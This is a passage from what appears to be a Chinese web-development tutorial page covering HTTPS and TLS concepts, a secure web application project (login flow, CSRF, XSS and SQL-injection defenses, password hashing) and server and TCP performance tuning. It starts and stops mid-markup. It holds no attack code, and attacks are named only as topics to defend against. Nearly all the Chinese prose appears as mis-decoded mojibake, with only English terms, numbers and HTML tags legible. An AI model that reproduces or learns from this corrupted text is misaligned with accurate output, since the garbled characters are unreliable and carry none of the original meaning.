class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">HTTPS = HTTP + TLS/SSL<br><br>åŠ å¯†æŠ€æœ¯ï¼š<br><span class="hljs-bullet">- </span>å¯¹ç§°åŠ å¯†ï¼šAESï¼ˆå¿«é€Ÿï¼‰<br><span class="hljs-bullet">- </span>éå¯¹ç§°åŠ å¯†ï¼šRSAï¼ˆå®‰å…¨ï¼‰<br><span class="hljs-bullet">- </span>å“ˆå¸Œå‡½æ•°ï¼šSHA-256<br><span class="hljs-bullet">- </span>æ•°å­—ç­¾åï¼šèº«ä»½è®¤è¯<br><br>TLSæ¡æ‰‹ï¼š<br>TLS 1.2ï¼š2-RTT<br>TLS 1.3ï¼š1-RTTï¼ˆæ›´å¿«ï¼‰<br><br>è¯ä¹¦ï¼š<br><span class="hljs-bullet">- </span>DVï¼šåŸŸåéªŒè¯<br><span class="hljs-bullet">- </span>OVï¼šç»„ç»‡éªŒè¯<br><span class="hljs-bullet">- </span>EVï¼šæ‰©å±•éªŒè¯<br><br>å®‰å…¨æ”»å‡»ï¼š<br><span class="hljs-bullet">- </span>ä¸­é—´äººæ”»å‡»ï¼ˆMITMï¼‰<br><span class="hljs-bullet">- </span>SSLå‰¥ç¦»<br><span class="hljs-bullet">- </span>XSS<br><span class="hljs-bullet">- </span>CSRF<br><span class="hljs-bullet">- </span>SQLæ³¨å…¥<br></code></pre></td></tr></table></figure><p><strong>å…³é”®æ¦‚å¿µ</strong>ï¼š</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">æ··åˆåŠ å¯†ï¼š<br><span class="hljs-number">1</span>. RSAäº¤æ¢å¯¹ç§°å¯†é’¥ï¼ˆå®‰å…¨ï¼‰<br><span class="hljs-number">2</span>. AESåŠ å¯†å®é™…æ•°æ®ï¼ˆå¿«é€Ÿï¼‰<br><br>HSTSï¼š<br><span class="hljs-keyword">Strict</span>-Transport-Security<br>å¼ºåˆ¶ä½¿ç”¨HTTPS<br>é˜²æ­¢SSLå‰¥ç¦»æ”»å‡»<br><br><span class="hljs-keyword">Let</span><span class="hljs-comment">&#x27;s Encryptï¼š</span><br>å…è´¹çš„CA<br>è‡ªåŠ¨åŒ–è¯ä¹¦ç®¡ç†<br><span class="hljs-number">90</span>å¤©æœ‰æ•ˆæœŸ<br></code></pre></td></tr></table></figure><hr><h2 id="2-ç»¼åˆå®æˆ˜é¡¹ç›®ï¼šå®‰å…¨Webåº”ç”¨å¹³å°"><a href="#2-ç»¼åˆå®æˆ˜é¡¹ç›®ï¼šå®‰å…¨Webåº”ç”¨å¹³å°" class="headerlink" title="2. ç»¼åˆå®æˆ˜é¡¹ç›®ï¼šå®‰å…¨Webåº”ç”¨å¹³å°"></a>2. ç»¼åˆå®æˆ˜é¡¹ç›®ï¼šå®‰å…¨Webåº”ç”¨å¹³å°</h2><h3 id="2-1-é¡¹ç›®éœ€æ±‚"><a href="#2-1-é¡¹ç›®éœ€æ±‚" class="headerlink" title="2.1 é¡¹ç›®éœ€æ±‚"></a>2.1 é¡¹ç›®éœ€æ±‚</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs markdown">é¡¹ç›®åç§°ï¼šSecureWebApp<br>é¡¹ç›®æè¿°ï¼šä¸€ä¸ªå®‰å…¨çš„Webåº”ç”¨å¹³å°<br><br>åŠŸèƒ½éœ€æ±‚ï¼š<br><span class="hljs-bullet">1.</span> ç”¨æˆ·ç®¡ç†<br><span class="hljs-bullet">   -</span> æ³¨å†Œ/ç™»å½•<br><span class="hljs-bullet">   -</span> Sessionç®¡ç†<br><span class="hljs-bullet">   -</span> æƒé™æ§åˆ¶<br><br><span class="hljs-bullet">2.</span> æ•°æ®API<br><span class="hljs-bullet">   -</span> RESTful API<br><span class="hljs-bullet">   -</span> JSONæ ¼å¼<br><span class="hljs-bullet">   -</span> CRUDæ“ä½œ<br><br><span class="hljs-bullet">3.</span> å®æ—¶é€šä¿¡<br><span class="hljs-bullet">   -</span> WebSocketï¼ˆæ¨¡æ‹Ÿï¼‰<br><span class="hljs-bullet">   -</span> å®æ—¶æ¶ˆæ¯æ¨é€<br><br><span class="hljs-bullet">4.</span> æ–‡ä»¶æœåŠ¡<br><span class="hljs-bullet">   -</span> é™æ€æ–‡ä»¶æœåŠ¡<br><span class="hljs-bullet">   -</span> æ–‡ä»¶ä¸Šä¼ /ä¸‹è½½<br><br><span class="hljs-bullet">5.</span> å®‰å…¨ç‰¹æ€§<br><span class="hljs-bullet">   -</span> HTTPSæ”¯æŒ<br><span class="hljs-bullet">   -</span> Cookieå®‰å…¨<br><span class="hljs-bullet">   -</span> CSRFé˜²æŠ¤<br><span class="hljs-bullet">   -</span> XSSé˜²æŠ¤<br><span class="hljs-bullet">   -</span> è¾“å…¥éªŒè¯<br><br>æŠ€æœ¯è¦æ±‚ï¼š<br><span class="hljs-bullet">-</span> æ”¯æŒHTTPå’ŒHTTPS<br><span class="hljs-bullet">-</span> ä½¿ç”¨IOå¤šè·¯å¤ç”¨ï¼ˆepoll/selectï¼‰<br><span class="hljs-bullet">-</span> å®ç°å®Œæ•´çš„HTTP/1.1åè®®<br><span class="hljs-bullet">-</span> å®‰å…¨æœ€ä½³å®è·µ<br><span class="hljs-bullet">-</span> æ€§èƒ½ç›‘æ§<br><span class="hljs-bullet">-</span> æ—¥å¿—è®°å½•<br></code></pre></td></tr></table></figure><h3 id="2-2-é¡¹ç›®æ¶æ„"><a href="#2-2-é¡¹ç›®æ¶æ„" class="headerlink" title="2.2 é¡¹ç›®æ¶æ„"></a>2.2 é¡¹ç›®æ¶æ„</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs markdown">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚           å®¢æˆ·ç«¯ï¼ˆæµè§ˆå™¨ï¼‰               â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><span class="hljs-code">                    â”‚</span><br><span class="hljs-code">                    â”‚ HTTPS</span><br><span class="hljs-code">                    â†“</span><br><span class="hljs-code">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><br><span class="hljs-code">â”‚          è´Ÿè½½å‡è¡¡ï¼ˆå¯é€‰ï¼‰                â”‚</span><br><span class="hljs-code">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><br><span class="hljs-code">                    â”‚</span><br><span class="hljs-code">        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><br><span class="hljs-code">        â”‚           â”‚           â”‚</span><br><span class="hljs-code">        â†“           â†“           â†“</span><br><span class="hljs-code">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><br><span class="hljs-code">â”‚  Web    â”‚   â”‚  Web    â”‚   â”‚  Web    â”‚</span><br><span class="hljs-code">â”‚ Server  â”‚   â”‚ Server  â”‚   â”‚ Server  â”‚</span><br><span class="hljs-code">â”‚  è¿›ç¨‹1  â”‚   â”‚  è¿›ç¨‹2  â”‚   â”‚  è¿›ç¨‹3  â”‚</span><br><span class="hljs-code">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><br><span class="hljs-code">        â”‚           â”‚           â”‚</span><br><span class="hljs-code">        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><br><span class="hljs-code">                    â”‚</span><br><span class="hljs-code">                    â†“</span><br><span class="hljs-code">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><br><span class="hljs-code">â”‚          æ•°æ®å­˜å‚¨ï¼ˆJSONæ–‡ä»¶/æ•°æ®åº“ï¼‰     â”‚</span><br><span class="hljs-code">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><br><span class="hljs-code"></span><br>æ¨¡å—åˆ’åˆ†ï¼š<br><span class="hljs-bullet">1.</span> HTTPæœåŠ¡å™¨æ¨¡å—<br><span class="hljs-bullet">   -</span> è¯·æ±‚è§£æ<br><span class="hljs-bullet">   -</span> å“åº”ç”Ÿæˆ<br><span class="hljs-bullet">   -</span> è·¯ç”±ç®¡ç†<br><br><span class="hljs-bullet">2.</span> HTTPSæ¨¡å—<br><span class="hljs-bullet">   -</span> SSL/TLSå¤„ç†<br><span class="hljs-bullet">   -</span> è¯ä¹¦ç®¡ç†<br><br><span class="hljs-bullet">3.</span> è®¤è¯æ¨¡å—<br><span class="hljs-bullet">   -</span> ç”¨æˆ·æ³¨å†Œ/ç™»å½•<br><span class="hljs-bullet">   -</span> Sessionç®¡ç†<br><span class="hljs-bullet">   -</span> æƒé™éªŒè¯<br><br><span class="hljs-bullet">4.</span> APIæ¨¡å—<br><span class="hljs-bullet">   -</span> RESTfulæ¥å£<br><span class="hljs-bullet">   -</span> æ•°æ®å¤„ç†<br><br><span class="hljs-bullet">5.</span> æ–‡ä»¶æ¨¡å—<br><span class="hljs-bullet">   -</span> é™æ€æ–‡ä»¶<br><span class="hljs-bullet">   -</span> æ–‡ä»¶ä¸Šä¼ <br><br><span class="hljs-bullet">6.</span> å®‰å…¨æ¨¡å—<br><span class="hljs-bullet">   -</span> CSRF Token<br><span class="hljs-bullet">   -</span> XSSè¿‡æ»¤<br><span class="hljs-bullet">   -</span> è¾“å…¥éªŒè¯<br><br><span class="hljs-bullet">7.</span> ç›‘æ§æ¨¡å—<br><span class="hljs-bullet">   -</span> æ€§èƒ½ç»Ÿè®¡<br><span class="hljs-bullet">   -</span> æ—¥å¿—è®°å½•<br></code></pre></td></tr></table></figure><h3 id="2-3-æ ¸å¿ƒåŠŸèƒ½å®ç°"><a href="#2-3-æ ¸å¿ƒåŠŸèƒ½å®ç°" class="headerlink" title="2.3 æ ¸å¿ƒåŠŸèƒ½å®ç°"></a>2.3 æ ¸å¿ƒåŠŸèƒ½å®ç°</h3><p><strong>ç”¨æˆ·è®¤è¯æµç¨‹</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs markdown">æ³¨å†Œï¼š<br><span class="hljs-bullet">1.</span> ç”¨æˆ·æäº¤æ³¨å†Œè¡¨å•ï¼ˆPOST /api/registerï¼‰<br><span class="hljs-bullet">2.</span> æœåŠ¡å™¨éªŒè¯è¾“å…¥ï¼ˆç”¨æˆ·åã€å¯†ç ã€é‚®ç®±ï¼‰<br><span class="hljs-bullet">3.</span> å¯†ç å“ˆå¸Œï¼ˆä½¿ç”¨bcryptæˆ–ç±»ä¼¼ç®—æ³•ï¼‰<br><span class="hljs-bullet">4.</span> å­˜å‚¨åˆ°æ•°æ®åº“<br><span class="hljs-bullet">5.</span> è¿”å›æˆåŠŸ<br><br>ç™»å½•ï¼š<br><span class="hljs-bullet">1.</span> ç”¨æˆ·æäº¤ç™»å½•è¡¨å•ï¼ˆPOST /api/loginï¼‰<br><span class="hljs-bullet">2.</span> æœåŠ¡å™¨éªŒè¯ç”¨æˆ·åå’Œå¯†ç <br><span class="hljs-bullet">3.</span> åˆ›å»ºSession<br><span class="hljs-bullet">4.</span> è®¾ç½®Session Cookieï¼ˆHttpOnlyã€Secureã€SameSiteï¼‰<br><span class="hljs-bullet">5.</span> è¿”å›æˆåŠŸ<br><br>è®¤è¯æ£€æŸ¥ï¼š<br><span class="hljs-bullet">1.</span> å®¢æˆ·ç«¯è¯·æ±‚å¸¦ä¸ŠCookie<br><span class="hljs-bullet">2.</span> æœåŠ¡å™¨è§£æCookieè·å–Session ID<br><span class="hljs-bullet">3.</span> æŸ¥æ‰¾Sessionæ•°æ®<br><span class="hljs-bullet">4.</span> éªŒè¯Sessionæœ‰æ•ˆæ€§<br><span class="hljs-bullet">5.</span> è·å–ç”¨æˆ·ä¿¡æ¯<br><span class="hljs-bullet">6.</span> ç»§ç»­å¤„ç†è¯·æ±‚<br></code></pre></td></tr></table></figure><p><strong>å®‰å…¨æªæ–½</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> CSRFé˜²æŠ¤<br><span class="hljs-bullet">   -</span> ç”ŸæˆCSRF Token<br><span class="hljs-bullet">   -</span> å­˜å‚¨åœ¨Sessionä¸­<br><span class="hljs-bullet">   -</span> è¡¨å•ä¸­åŒ…å«Token<br><span class="hljs-bullet">   -</span> æœåŠ¡å™¨éªŒè¯Token<br><br><span class="hljs-bullet">2.</span> XSSé˜²æŠ¤<br><span class="hljs-bullet">   -</span> è¾“å‡ºç¼–ç ï¼ˆHTMLå®ä½“ï¼‰<br><span class="hljs-bullet">   -</span> Content-Security-Policyå¤´<br><span class="hljs-bullet">   -</span> HttpOnly Cookie<br><br><span class="hljs-bullet">3.</span> SQLæ³¨å…¥é˜²æŠ¤<br><span class="hljs-bullet">   -</span> å‚æ•°åŒ–æŸ¥è¯¢<br><span class="hljs-bullet">   -</span> ORMæ¡†æ¶<br><span class="hljs-bullet">   -</span> è¾“å…¥éªŒè¯<br><br><span class="hljs-bullet">4.</span> å¯†ç å®‰å…¨<br><span class="hljs-bullet">   -</span> å¼ºå¯†ç è¦æ±‚<br><span class="hljs-bullet">   -</span> å¯†ç å“ˆå¸Œï¼ˆbcryptã€argon2ï¼‰<br><span class="hljs-bullet">   -</span> åŠ ç›ï¼ˆSaltï¼‰<br><span class="hljs-bullet">   -</span> é™åˆ¶ç™»å½•å°è¯•<br><br><span class="hljs-bullet">5.</span> HTTPS<br><span class="hljs-bullet">   -</span> å¼ºåˆ¶HTTPSï¼ˆHSTSï¼‰<br><span class="hljs-bullet">   -</span> åªä½¿ç”¨TLS 1.2+<br><span class="hljs-bullet">   -</span> å¼ºåŠ å¯†å¥—ä»¶<br></code></pre></td></tr></table></figure><hr><h2 id="3-æ€§èƒ½ä¼˜åŒ–æŠ€å·§"><a href="#3-æ€§èƒ½ä¼˜åŒ–æŠ€å·§" class="headerlink" title="3. æ€§èƒ½ä¼˜åŒ–æŠ€å·§"></a>3. æ€§èƒ½ä¼˜åŒ–æŠ€å·§</h2><h3 id="3-1-æœåŠ¡å™¨ç«¯ä¼˜åŒ–"><a href="#3-1-æœåŠ¡å™¨ç«¯ä¼˜åŒ–" class="headerlink" title="3.1 æœåŠ¡å™¨ç«¯ä¼˜åŒ–"></a>3.1 æœåŠ¡å™¨ç«¯ä¼˜åŒ–</h3><p><strong>IOä¼˜åŒ–</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> ä½¿ç”¨epollï¼ˆLinuxï¼‰<br><span class="hljs-bullet">   -</span> O(1)å¤æ‚åº¦<br><span class="hljs-bullet">   -</span> è¾¹ç¼˜è§¦å‘<br><span class="hljs-bullet">   -</span> ç™¾ä¸‡å¹¶å‘<br><br><span class="hljs-bullet">2.</span> éé˜»å¡IO<br><span class="hljs-bullet">   -</span> æé«˜å¹¶å‘èƒ½åŠ›<br><span class="hljs-bullet">   -</span> é¿å…çº¿ç¨‹é˜»å¡<br><br><span class="hljs-bullet">3.</span> é›¶æ‹·è´<br><span class="hljs-bullet">   -</span> sendfile()ç³»ç»Ÿè°ƒç”¨<br><span class="hljs-bullet">   -</span> å‡å°‘æ•°æ®æ‹·è´<br><span class="hljs-bullet">   -</span> æé«˜æ–‡ä»¶ä¼ è¾“æ•ˆç‡<br><br><span class="hljs-bullet">4.</span> å†…å­˜æ˜ å°„<br><span class="hljs-bullet">   -</span> mmap()<br><span class="hljs-bullet">   -</span> ç›´æ¥æ˜ å°„æ–‡ä»¶åˆ°å†…å­˜<br><span class="hljs-bullet">   -</span> é€‚åˆå¤§æ–‡ä»¶<br></code></pre></td></tr></table></figure><p><strong>è¿æ¥ä¼˜åŒ–</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> è¿æ¥æ± <br><span class="hljs-bullet">   -</span> å¤ç”¨è¿æ¥<br><span class="hljs-bullet">   -</span> å‡å°‘å»ºç«‹å¼€é”€<br><br><span class="hljs-bullet">2.</span> Keep-Alive<br><span class="hljs-bullet">   -</span> HTTPæŒä¹…è¿æ¥<br><span class="hljs-bullet">   -</span> å¤ç”¨TCPè¿æ¥<br><br><span class="hljs-bullet">3.</span> è¿æ¥é™åˆ¶<br><span class="hljs-bullet">   -</span> é™åˆ¶æœ€å¤§è¿æ¥æ•°<br><span class="hljs-bullet">   -</span> é˜²æ­¢èµ„æºè€—å°½<br><br><span class="hljs-bullet">4.</span> è¶…æ—¶è®¾ç½®<br><span class="hljs-bullet">   -</span> è¯»è¶…æ—¶<br><span class="hljs-bullet">   -</span> å†™è¶…æ—¶<br><span class="hljs-bullet">   -</span> ç©ºé—²è¶…æ—¶<br></code></pre></td></tr></table></figure><p><strong>ç¼“å­˜ä¼˜åŒ–</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> é™æ€èµ„æºç¼“å­˜<br><span class="hljs-bullet">   -</span> Cache-Controlå¤´<br><span class="hljs-bullet">   -</span> ETag<br><span class="hljs-bullet">   -</span> Last-Modified<br><br><span class="hljs-bullet">2.</span> å†…å­˜ç¼“å­˜<br><span class="hljs-bullet">   -</span> Redis<br><span class="hljs-bullet">   -</span> Memcached<br><span class="hljs-bullet">   -</span> åº”ç”¨å†…ç¼“å­˜<br><br><span class="hljs-bullet">3.</span> CDN<br><span class="hljs-bullet">   -</span> å†…å®¹åˆ†å‘ç½‘ç»œ<br><span class="hljs-bullet">   -</span> è¾¹ç¼˜ç¼“å­˜<br><span class="hljs-bullet">   -</span> å‡å°‘å»¶è¿Ÿ<br><br><span class="hljs-bullet">4.</span> æµè§ˆå™¨ç¼“å­˜<br><span class="hljs-bullet">   -</span> å¼ºç¼“å­˜<br><span class="hljs-bullet">   -</span> åå•†ç¼“å­˜<br></code></pre></td></tr></table></figure><p><strong>å¹¶å‘ä¼˜åŒ–</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> å¤šè¿›ç¨‹<br><span class="hljs-bullet">   -</span> åˆ©ç”¨å¤šæ ¸CPU<br><span class="hljs-bullet">   -</span> è¿›ç¨‹éš”ç¦»<br><span class="hljs-bullet">   -</span> ç¨³å®šæ€§å¥½<br><br><span class="hljs-bullet">2.</span> çº¿ç¨‹æ± <br><span class="hljs-bullet">   -</span> å›ºå®šæ•°é‡çº¿ç¨‹<br><span class="hljs-bullet">   -</span> ä»»åŠ¡é˜Ÿåˆ—<br><span class="hljs-bullet">   -</span> é¿å…é¢‘ç¹åˆ›å»º<br><br><span class="hljs-bullet">3.</span> åç¨‹<br><span class="hljs-bullet">   -</span> è½»é‡çº§<br><span class="hljs-bullet">   -</span> é«˜å¹¶å‘<br><span class="hljs-bullet">   -</span> é€‚åˆIOå¯†é›†<br><br><span class="hljs-bullet">4.</span> å¼‚æ­¥ç¼–ç¨‹<br><span class="hljs-bullet">   -</span> asyncio<br><span class="hljs-bullet">   -</span> äº‹ä»¶å¾ªç¯<br><span class="hljs-bullet">   -</span> å›è°ƒå‡½æ•°<br></code></pre></td></tr></table></figure><h3 id="3-2-ç½‘ç»œä¼˜åŒ–"><a href="#3-2-ç½‘ç»œä¼˜åŒ–" class="headerlink" title="3.2 ç½‘ç»œä¼˜åŒ–"></a>3.2 ç½‘ç»œä¼˜åŒ–</h3><p><strong>TCPä¼˜åŒ–</strong>ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span>. è°ƒæ•´çª—å£å¤§å°<br>   net<span class="hljs-selector-class">.ipv4</span><span class="hljs-selector-class">.tcp_window_scaling</span> = <span class="hljs-number">1</span><br>   net<span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.rmem_max</span> = <span class="hljs-number">16777216</span><br>   net<span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.wmem_max</span> = <span class="hljs-number">16777216</span><br><br><span class="hljs-number">2</span>. å¯ç”¨å¿«é€Ÿå›æ”¶<br>   net<span class="hljs-selector-class">.ipv4</span><span class="hljs-selector-class">.tcp_tw_reuse</span> = <span class="hljs-number">1</span><br>   net<span class="hljs-selector-class">.ipv4</span><span class="hljs-selector-class">.tcp_fin_timeout</span> = <span class="hljs-number">30</span><br><br><span class="hljs-number">3</span>. è°ƒæ•´é˜Ÿåˆ—é•¿åº¦<br>   net<span class="hljs-selector-class">.core</span><span class="hljs-selector-class">.somaxconn</span> = <span class="hljs-number">1024</span><br>   net<span class="hljs-selector-class">.ipv4</span><span class="hljs-selector-class">.tcp_max_syn_backlog</span> = <span class="hljs-number">2048</span><br><br><span class="hljs-number">4</span>. å¯ç”¨BBRæ‹¥å¡æ§åˆ¶<br>   net<span class="hljs-selector-class">.ipv4</span><span class="hljs-selector-class">.tcp_congestion_control</span> = bbr<br></code></pre></td></tr></table></figure><p><strong>HTTPä¼˜åŒ–</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> HTTP/2<br><span class="hljs-bullet">   -</span> å¤šè·¯å¤ç”¨<br><span class="hljs-bullet">   -</span> å¤´éƒ¨å‹ç¼©<br><span class="hljs-bullet">   -</span> æœåŠ¡å™¨æ¨é€<br><br><span class="hljs-bullet">2.</span> å‹ç¼©<br><span class="hljs-bullet">   -</span> Gzip<br><span class="hljs-bullet">   -</span> Brotli<br><span class="hljs-bullet">   -</span> å‡å°‘ä¼ è¾“å¤§å°<br><br><span class="hljs-bullet">3.</span> å‡å°‘è¯·æ±‚<br><span class="hljs-bullet">   -</span> åˆå¹¶æ–‡ä»¶<br><span class="hljs-bullet">   -</span> CSS Sprite<br><span class="hljs-bullet">   -</span> 